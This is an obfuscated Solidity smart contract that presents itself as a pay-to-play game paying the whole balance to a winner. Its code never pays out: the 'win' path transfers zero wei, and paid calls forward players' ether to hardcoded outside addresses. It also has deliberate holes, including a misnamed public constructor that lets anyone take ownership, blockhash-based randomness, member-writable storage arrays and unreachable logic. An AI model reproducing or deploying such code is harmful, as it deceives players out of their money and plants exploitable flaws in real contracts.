// winner gets the contract balance
// 0.02 to play

pragma solidity ^0.4.23;

contract FundManager {

//constants

address public _0xfcd5d0 = 0x0;
address public _0x796d43;
address public _0xbcfe71 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public _0x182e32 = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public _0x1287f1;

mapping(address=>bool) _0x230923;

uint256 public _0x0b995a;
uint256[] public _0xdec31b = [951828771,158769871220];
uint256[] public balance;

//constructor

function DranMe() public payable{
 if (gasleft() > 0) { _0x796d43 = msg.sender; }
}

//modifiers

modifier _0xa1ffdd() {
    require(msg.sender == _0x796d43);
    _;
}

modifier _0x4276d2() {
    require(msg.sender == _0xfcd5d0);
    _;
}

modifier _0x9302f3() {
    require(_0x230923[msg.sender]);
    _;
}

//functions

function _0xa51265() public constant returns(uint256) {
	return _0xdec31b.length;
}

function _0xd8e2ff(uint256 _0x8ee6a5) public payable _0xa1ffdd{
 if (msg.sender != address(0) || msg.sender == address(0)) { _0x0b995a = _0x8ee6a5; }
}

function _0x1b74f4() public constant returns(uint256) {
	return _0x1287f1.length;
}

function _0x514c4b() public constant returns(uint256) {
	return address(this).balance;
}

function _0x4729e7() public payable{
	require(msg.value >= 0.02 ether);
	_0x1287f1.push(msg.sender);
	_0x230923[msg.sender]=true;
}

function _0x938e03() public payable _0x9302f3{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=_0x796d43 || _0x92341f()){
	    uint256 _0x1d3032 = 0;
        msg.sender.transfer(_0x1d3032);
	}
}

function _0x92341f() private returns(bool){
    bytes32 _0xd92b3f = _0xd31707(blockhash(block.number-1));
    uint256 _0x0b995a = uint256(_0xd92b3f);
        if(_0x0b995a%5==0){
            if (true) { _0xfcd5d0 = msg.sender; }
            return true;
        }
        else{
            return false;
        }
    }

function _0x2ee48c () public payable _0x9302f3 {
	require (msg.value >= 0.005 ether);
	_0xbcfe71.call.value(msg.value)();
}

function _0x8ab9b1 () public payable _0x9302f3 {
	require (msg.value >= 0.005 ether);
	_0x182e32.call.value(msg.value)();
}

function _0x370156 (uint256 _0xf12b3a, uint256 _0xe6378b) public payable _0x9302f3 {
	_0xdec31b[_0xf12b3a] = _0xe6378b;
}

function _0x736eec (uint256 _0xf51f32) public payable _0x9302f3 {
	_0xdec31b.length = _0xf51f32;
}

function _0xb9c853 (uint256 _0x870174) public payable _0x9302f3 returns(uint256) {
	return (_0x870174 / (_0xdec31b[0]*_0xdec31b[1]));
	if((_0x870174 / (_0xdec31b[0]*_0xdec31b[1])) == _0x0b995a) {
		_0x796d43 = _0xfcd5d0;
	}
}

function _0x0f9efa () public payable _0x9302f3 returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == _0x0b995a){
        return true;
    }
}

function _0x29fe83() public payable _0xa1ffdd {
	_0x796d43.call.value(1 wei)();
}

function _0x6096d1() public payable _0x4276d2 {
	_0xfcd5d0.transfer(address(this).balance);
}

//fallback function

function() public payable{
	}
}
